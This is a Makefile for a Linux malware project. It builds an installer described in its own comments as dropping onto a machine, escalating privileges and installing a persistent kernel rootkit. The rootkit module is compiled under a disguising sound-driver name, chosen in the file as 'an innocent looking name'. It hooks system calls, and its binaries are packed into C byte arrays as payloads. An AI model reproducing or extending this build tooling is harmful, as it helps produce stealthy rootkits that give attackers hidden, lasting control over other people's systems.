CC = gcc
_CFLAGS_ = -O2 -s -static   -Wall -Wno-comment
CFLAGS_SO = -fPIC -shared -ldl

LIBS = -lpthread


CPP_INCLUDE_DIR = /usr/include/c++/7
KERNELS_SRC_DIR = ../linux_kernels

KERNEL_4_16_2 = $(KERNELS_SRC_DIR)/linux-4.16.2
KERNEL_HEADERS_4_16_2 = -I $(KERNEL_4_16_2)/include/ 	      -I $(KERNEL_4_16_2)/include/uapi \
			-I $(KERNEL_4_16_2)/arch/ia64/include -I $(KERNEL_4_16_2)/arch/ia64/include/uapi

CFLAGS_KO = -nostdinc $(KERNEL_HEADERS_4_16_2) #-I $(CPP_INCLUDE_DIR) -I $(CPP_INCLUDE_DIR)/tr1/ -I $(CPP_INCLUDE_DIR)/parallel/ -I /usr/include/x86_64-linux-gnu/c++/7/



MAGIC_STR = 828db6a29e08d2bc967fee35d311da78 # !!! KEEP THIS A SECRET !!!


PAYLOADS_DIR = ./payloads



PROGS = installer_linux \
		lins_$(MAGIC_STR) # The Linux installer
ROOTKIT_MODULE_NAME = snd_ens1372 # An innocent looking name
ROOTKIT_OBJ_FILENAME = snd_ens1372.o
ROOTKIT_KO_FILENAME = snd_ens1372.ko



SRCS   = hello.c
OBJS   = $(SRCS:.c=.o)

obj-m += $(OBJS) $(ROOTKIT_OBJ_FILENAME)
snd_ens1372-objs := kernel_rootkit.o

EXTRA_CFLAGS = -O2 \
	-Wall -Wno-comment -Wno-int-conversion -Wno-strict-prototypes -Wno-declaration-after-statement \
	-D ALLOW_MODULE_UNLOAD -D K_DEBUG


.PHONY: all clean $(PROGS)



all:
	@echo "You must individually build specific targets"
	@exit


# The Linux installer
lins_$(MAGIC_STR): \
		installer_linux.c \
		libc_impl.h libc_impl.c \
		exploit.h \
		payloads/payloads.h

	@echo "!!! Make sure to compile all kernel modules on their individual target machines before building this target"
	@echo "!!! Make sure to compile all payloads before building this target"

	$(CC) $(_CFLAGS_) installer_linux.c libc_impl.c $(LIBS) -o $@ \
		#-D U_DEBUG
	
	@# Write out file comment header
	@echo "/* \n\
	 * The full Linux installer executable as a static byte array. Simply\n\
	 * drop this installer on a Linux machine and run it. It will automatically\n\
	 * perform local privilege escalation as necessary and install a persistent\n\
	 * kernel rootkit.\n\
	 * \n\
	 * Author: Daniel Liscinsky\n\
	 */\n\
	\n\
	\n" > $(PAYLOADS_DIR)/payload_linux_installer.h
	@#\n" > $(PAYLOADS_DIR)/payload_lins_$(MAGIC_STR)
	
	# TODO
	# TODO if compressing / encrypting payload, do so here

	@# Dump binary as C byte array
	@cp lins_$(MAGIC_STR) installer_linux
	@xxd -i installer_linux >> $(PAYLOADS_DIR)/payload_linux_installer.h

	
kernel_modules: \
		kernel_rootkit.c \
		hooked_kernel_syscalls.h hooked_kernel_syscalls.c \
		magic.h debug.h
#	make -C /lib/modules/4.15.0-kali2-amd64/build M=$(PWD) $(CFLAGS_KO) modules
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
	
	@# Strip all debugging symbols (cannot strip any more or else the kernel module will break)
	@strip --strip-debug $(ROOTKIT_KO_FILENAME)

	@# Write out file comment header
	@echo "/* \n\
	 * The rootkit kernel module .ko file as a static byte array.\n\
	 * Compiled against kernel version `uname -r`.\n\
	 * \n\
	 * Author: Daniel Liscinsky\n\
	 */\n\
	\n\
	\n" >  $(PAYLOADS_DIR)/payload_kernel_`uname -r | sed 's/\(\.\|-\)/_/g'`_rootkit.h

	@# Rename .ko file to kernel version specific name
	@mv $(ROOTKIT_KO_FILENAME) kernel_`uname -r | sed 's/\(\.\|-\)/_/g'`.ko

	# TODO
	# TODO if compressing / encrypting payload, do so here

	@# Dump binary as C byte array
	@xxd -i kernel_`uname -r | sed 's/\(\.\|-\)/_/g'`.ko >> $(PAYLOADS_DIR)/payload_kernel_`uname -r | sed 's/\(\.\|-\)/_/g'`_rootkit.h



forward_router: userland_forward_router.c rte_ether.h rte_ip.h
	$(CC) $(_CFLAGS_) userland_forward_router.c -o $@

	@# Move executable file to payloads directory
	@#mv $@ $(PAYLOADS_DIR)/



clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
	@rm -f $(PROGS)
